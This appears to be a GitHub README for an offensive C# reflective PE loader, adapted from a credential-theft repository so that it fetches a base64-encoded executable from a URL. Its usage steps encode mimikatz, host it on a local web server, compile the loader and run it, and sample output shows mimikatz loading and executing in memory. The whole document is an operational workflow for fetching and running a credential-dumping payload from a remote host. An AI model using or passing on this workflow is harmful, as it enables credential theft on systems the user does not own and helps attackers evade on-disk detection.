# PELoader.cs but it takes an url
Not my original code, all credits goes to : https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs  
I simple add code to take the base64 PE from an url.
## Usage
1. Encode your file :
```
base64 -w 0 mimikatz.exe
```
2. Host it on a webserver as you want
3. Compile with :
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:peloader.exe peloader.cs
```
4. Launch the tool, enter the url and press enter 2 : times
```
C:\Temp\PELoadercs>peloader.exe
[*] Enter URL to the base64 PE file :
http://192.168.1.196:8000/mimikatz.b64
[*] URL : http://192.168.1.196:8000/mimikatz.b64
[*] Downloading file...
[+] Content stored with success
[+] Preview(50 chars) : TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAA...
Preferred Load Address = 140000000
Allocated Space For 133000 at 1BB20000
Section .text   , Copied To 1BB21000
Section .rdata  , Copied To 1BBE4000
Section .data   , Copied To 1BC3D000
Section .pdata  , Copied To 1BC45000
Section .rsrc   , Copied To 1BC4C000
Section .reloc  , Copied To 1BC50000
Delta = FFFFFFFEDBB20000
Loaded ADVAPI32.dll
Loaded Cabinet.dll

[...]

Loaded ntdll.dll
Loaded netapi32.dll
Loaded KERNEL32.dll
Loaded msvcrt.dll
Executing loaded PE

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz #
```
